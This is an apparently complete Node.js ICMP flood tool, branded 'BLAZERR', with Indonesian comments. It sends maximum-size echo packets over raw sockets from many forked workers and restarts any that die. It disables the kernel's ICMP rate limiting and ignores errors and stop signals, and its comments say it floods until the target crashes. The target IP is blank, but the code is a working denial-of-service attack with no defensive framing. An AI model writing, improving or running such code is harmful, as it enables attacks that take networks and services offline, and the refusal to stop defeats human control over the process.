const raw = require('raw-socket');
const dgram = require('dgram');
const os = require('os');
const cluster = require('cluster');
const numCPUs = os.cpus().length;

// Konfigurasi target
const TARGET_IP = '';
const FLOOD_SIZE = 65507; // Ukuran packet maksimal
const THREADS = numCPUs * 10; // Multi-threading ekstrem

// Membuat ICMP Echo Request packet (raw)
function createICMPPacket(seq, payloadSize) {
    const buf = Buffer.alloc(8 + payloadSize);
    
    // ICMP Header
    buf.writeUInt8(8, 0);  // Type: Echo Request
    buf.writeUInt8(0, 1);  // Code: 0
    buf.writeUInt16BE(0, 2); // Checksum (diisi nanti)
    buf.writeUInt16BE(seq, 4); // Identifier
    buf.writeUInt16BE(seq, 6); // Sequence Number
    
    // Payload acak untuk ukuran besar
    for (let i = 8; i < buf.length; i++) {
        buf[i] = Math.floor(Math.random() * 256);
    }
    
    // Hitung checksum
    let sum = 0;
    for (let i = 0; i < buf.length; i += 2) {
        if (i + 1 < buf.length) {
            sum += (buf[i] << 8) + buf[i + 1];
        } else {
            sum += buf[i] << 8;
        }
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    sum = ~sum;
    
    buf.writeUInt16BE(sum & 0xFFFF, 2);
    return buf;
}

// Fungsi flood ICMP menggunakan raw socket
function icmpFloodWorker() {
    const socket = raw.createSocket({
        protocol: raw.Protocol.ICMP
    });
    
    let sequence = 0;
    const maxRate = 100000; // Packets per second per thread
    
    socket.on('error', (error) => {
        // Biarkan error, terus kirim
    });
    
    // Kirim packet terus menerus
    const floodInterval = setInterval(() => {
        for (let i = 0; i < maxRate / 100; i++) {
            const packet = createICMPPacket(sequence++, FLOOD_SIZE - 8);
            try {
                socket.send(packet, 0, packet.length, TARGET_IP, 
                    (error) => {
                        if (error && error.code !== 'EAGAIN') {
                            // Skip error, terus flood
                        }
                    }
                );
            } catch (e) {
                // Ignore semua error
            }
        }
    }, 10); // Interval 10ms untuk throughput tinggi
    
    // Jangan pernah berhenti
    process.on('uncaughtException', () => {
        // Tetap lanjut flood
    });
}

// Multi-threading massal
if (cluster.isMaster) {
    console.log(`[BLAZERR] ICMP FLOOD 100% AKTIF`);
    console.log(`[!] Target: ${TARGET_IP}`);
    console.log(`[!] Threads: ${THREADS}`);
    console.log(`[!] Packet size: ${FLOOD_SIZE} bytes`);
    
    // Buat thread sebanyak mungkin
    for (let i = 0; i < THREADS; i++) {
        cluster.fork();
    }
    
    // Auto-restart jika thread mati
    cluster.on('exit', () => {
        cluster.fork();
    });
} else {
    // Setiap thread menjalankan flood
    icmpFloodWorker();
}

// Optimasi kernel untuk throughput maksimal
const { execSync } = require('child_process');
try {
    // Nonaktifkan ICMP rate limiting (Linux)
    execSync('sysctl -w net.ipv4.icmp_ratelimit=0');
    execSync('sysctl -w net.ipv4.icmp_ratemask=0');
    execSync('sysctl -w net.ipv4.ip_default_ttl=255');
    // Tingkatkan buffer size
    execSync('sysctl -w net.core.rmem_max=134217728');
    execSync('sysctl -w net.core.wmem_max=134217728');
} catch (e) {
    // Skip jika tidak ada akses root
}

// Cleanup tidak diperlukan - flood sampai sistem crash
process.on('SIGINT', () => {
    // Tetap lanjut bahkan setelah sinyal stop
    console.log('[!] Flood tidak dapat dihentikan');
});